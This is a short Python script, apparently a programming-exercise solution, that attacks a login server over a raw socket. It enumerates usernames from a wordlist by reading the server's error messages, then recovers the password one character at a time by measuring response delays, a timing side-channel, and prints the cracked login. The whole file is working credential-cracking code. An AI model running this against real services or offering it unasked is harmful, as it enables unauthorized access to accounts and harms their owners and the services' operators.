import socket
import itertools
import sys
import json
from datetime import datetime

args = sys.argv
hostname = args[1]
port = int(args[2])

def get_address(hostname, port):
    return (hostname, port)

def char():
    for i in range(32, 127):
        yield chr(i)

def pass_maker(chars):
    for i in range(1, len(chars) + 1):
        for n in itertools.product(chars, repeat=i):
            yield ''.join(n)

def pass_reader(pass_file):
    for line in pass_file:
        if line:
            password = line.strip()
            pass_letters = []
            for i in password:
                if i in '0123456789':
                    pass_letters.append(i)
                    continue
                else:
                    pass_letters.append((i, i.upper()))
            pass_upper_lower = itertools.product(*pass_letters)
            for i in pass_upper_lower:
                yield ''.join(i)

def username(username_file):
    for line in username_file:
        yield line.strip()


ch = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
chc = []
chars = char()
for char in chars:
    chc.append(char)


check = 1

with socket.socket() as client_socket, open('logins.txt', 'r', encoding='utf-8') as username_file:

    address = get_address(hostname, port)

    client_socket.connect(address)

    usernames = username(username_file)
    password = ['']

    for i in usernames:

        username = i

        data = {"login": username, "password": password[0]}
        data = json.dumps(data).encode()
        client_socket.send(data)

        response = client_socket.recv(1024)
        response = response.decode()
        response = json.loads(response)

        if response == {"result": "Wrong password!"}:
            break

    while check:
        for j in ch:

            data = {"login": username, "password": ''.join(password) + j}
            data = json.dumps(data).encode()
            client_socket.send(data)

            start = datetime.now()

            response = client_socket.recv(1024)
            response = response.decode()

            response = json.loads(response)

            finish = datetime.now()
            diff = finish - start

            if diff.microseconds >= 90000:

                password.append(j)
                continue
            if response == {"result": "Connection success!"}:
                check = 0
                password.append(j)
                break
    print(json.dumps({"login": username, "password": ''.join(password)}))


